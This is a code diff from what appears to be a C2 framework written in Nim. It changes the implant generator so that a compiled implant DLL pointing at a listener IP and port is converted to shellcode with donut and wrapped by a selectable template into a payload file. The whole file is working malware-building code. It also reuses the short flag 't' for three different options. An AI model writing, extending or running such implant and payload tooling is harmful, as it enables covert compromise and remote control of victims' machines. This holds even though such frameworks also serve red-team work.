@@ -1,5 +1,7 @@
 import ../prelude
 
+import ../../templates/templates
+
 proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
   
   var listenerType: string = flags.getOrDefault("type", flags.getOrDefault("t", ""))
@@ -7,7 +9,8 @@ proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: T
   var platform: string = flags.getOrDefault("platform", flags.getOrDefault("P", "windows"))
   var ip: string = flags.getOrDefault("ip", flags.getOrDefault("i", ""))
   var port: string = flags.getOrDefault("port", flags.getOrDefault("p", ""))
-  var format: string = flags.getOrDefault("format", flags.getOrDefault("f", "exe"))
+  var tmpl: string = flags.getOrDefault("template", flags.getOrDefault("t", "none"))
+  var format: string = flags.getOrDefault("format", flags.getOrDefault("f", "dll"))
   var showWindow: bool = parseBool(flags.getOrDefault("showwindow", flags.getOrDefault("s", "no")))
   var autoConnectTime: string = flags.getOrDefault("autoconnect", flags.getOrDefault("t", "5000"))
 
@@ -16,7 +19,6 @@ proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: T
       errorLog "can't generate shellcode on linux"
       return
 
-  # infoLog "generating implant for " & $tcpListener
   if listenerType == "tcp" and ip == "" and port == "":
     errorLog "you must specify and --ip and --port for the tcp client"
     return
@@ -28,10 +30,11 @@ proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: T
         port = $listener.port.uint
         listenerType = listener.listenerType
 
-  var createShellcode = false
-  if format == "shellcode":
-    format = "dll"
-    createShellcode = true
+  var useTemplate = tmpl != "none"
+  
+  if useTemplate and format != "dll":
+    errorLog "if you want to use template, you must compile as a dll"
+    return
 
   let compileCommand = "nim -d:client " &
     (if showWindow or format == "dll": "" else: "--app=gui " & " ") & # disable window
@@ -59,9 +62,9 @@ proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: T
   if exitCode != 0:
     errorLog "failed to compiled implant"
   else:
-    successLog "successfully saved implant" & (if createShellcode: ", now building shellcode.." else: "")
+    successLog "successfully saved implant" & (if useTemplate: ", applying template.." else: "")
   
-  if not createShellcode: return
+  if not useTemplate: return
 
   if not fileExists("tools/donut/donut.exe"):
     errorLog "couldn't find donut at ./tools/donut/donut.exe"
@@ -69,7 +72,23 @@ proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: T
 
   exitCode = execCmd("tools/donut/donut.exe -f ./implant.dll")
 
+  moveFile("payload.bin", "_payload.bin")
+
+  let shellcode = readFile("_payload.bin")
+
+  for tmpl1 in templates.templates:
+    if tmpl1.name == tmpl:
+      let fileName = "payload." & tmpl1.outExtension
+      if fileExists(fileName): removeFile(fileName)
+      let payload = tmpl1.build(shellcode)
+      if payload != "": 
+        writeFile(fileName, payload)
+        successLog "payload saved to " & fileName 
+      break
+
+  # clean up temp files
   removeFile("implant.dll")
+  removeFile("_payload.bin")
 
 let cmd*: Command = Command(
   execProc: execProc,
